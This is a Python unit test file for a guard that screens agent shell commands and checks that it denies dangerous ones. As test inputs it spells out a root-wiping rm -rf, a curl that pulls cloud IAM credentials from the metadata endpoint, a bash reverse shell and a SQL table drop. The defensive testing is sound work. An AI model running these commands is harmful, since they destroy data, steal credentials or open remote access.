import unittest
import json
import time
from btp_guard import Guard

class TestSidecarProxySecurity(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.guard = Guard()
        # Warm up engine regex and crypto tables
        cls.guard.check("echo warmup")

    def test_benign_tool_call_allowed(self):
        res = self.guard.check("git status")
        self.assertTrue(res["allowed"])
        self.assertEqual(res["verdict"], "ALLOW")

    def test_catastrophic_rm_rf_intercepted(self):
        res = self.guard.check("rm -rf / --no-preserve-root")
        self.assertFalse(res["allowed"])
        self.assertEqual(res["verdict"], "DENY")
        self.assertIn("Catastrophic shell pattern detected", res["reason"])
        self.assertIn("receipt", res)

    def test_ssrf_metadata_exfiltration_intercepted(self):
        res = self.guard.check("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        self.assertFalse(res["allowed"])
        self.assertEqual(res["verdict"], "DENY")

    def test_reverse_shell_intercepted(self):
        res = self.guard.check("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        self.assertFalse(res["allowed"])
        self.assertEqual(res["verdict"], "DENY")

    def test_zero_vram_and_sub_millisecond_latency(self):
        res = self.guard.check("DROP TABLE users CASCADE;")
        self.assertFalse(res["allowed"])
        # Engine latency must be sub-millisecond (< 1000 µs)
        engine_latency = res.get("latency_us", 0)
        self.assertLess(engine_latency, 1000, f"Engine latency {engine_latency}µs exceeded 1000µs")

if __name__ == "__main__":
    unittest.main()
